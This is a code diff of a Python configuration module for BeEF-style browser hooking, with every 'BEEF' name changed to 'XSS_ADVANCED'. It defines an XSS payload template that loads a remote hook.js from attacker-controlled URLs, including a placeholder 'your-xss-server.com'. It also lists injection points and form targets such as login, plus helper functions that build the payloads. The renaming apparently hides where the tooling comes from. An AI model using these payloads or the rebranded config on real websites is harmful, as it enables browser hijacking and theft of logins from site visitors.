@@ -1,9 +1,9 @@
-BEEF_CONFIG = {
+XSS_ADVANCED_CONFIG = {
     "default_hook_url": "http://localhost:3000/hook.js",
     "alternative_hooks": [
         "http://192.168.1.100:3000/hook.js",
-        "http://beef.local:3000/hook.js",
-        "https://your-beef-server.com/hook.js"
+        "http://xss.local:3000/hook.js",
+        "https://your-xss-server.com/hook.js"
     ],
     "payloads": {
         "hook": '<script src="{hook_url}"></script>',
@@ -21,11 +21,10 @@ BEEF_CONFIG = {
         "<body>"
     ],
     "detection_patterns": [
-        r'beef\.js',
         r'hook\.js',
         r'localhost:3000',
-        r'beef_hook',
-        r'beef\.local'
+        r'advanced_hook',
+        r'xss\.local'
     ],
     "form_targets": [
         "login",
@@ -37,17 +36,17 @@ BEEF_CONFIG = {
     ]
 }
 
-def get_beef_hook_url(custom_url=None):
+def get_xss_advanced_hook_url(custom_url=None):
     if custom_url:
         return custom_url
-    return BEEF_CONFIG["default_hook_url"]
+    return XSS_ADVANCED_CONFIG["default_hook_url"]
 
-def get_payload(payload_type, hook_url):
-    payload_template = BEEF_CONFIG["payloads"].get(payload_type, BEEF_CONFIG["payloads"]["hook"])
+def get_xss_advanced_payload(payload_type, hook_url):
+    payload_template = XSS_ADVANCED_CONFIG["payloads"].get(payload_type, XSS_ADVANCED_CONFIG["payloads"]["hook"])
     return payload_template.format(hook_url=hook_url)
 
-def get_injection_points():
-    return BEEF_CONFIG["injection_points"]
+def get_xss_advanced_injection_points():
+    return XSS_ADVANCED_CONFIG["injection_points"]
 
-def get_detection_patterns():
-    return BEEF_CONFIG["detection_patterns"] 
+def get_xss_advanced_detection_patterns():
+    return XSS_ADVANCED_CONFIG["detection_patterns"] 
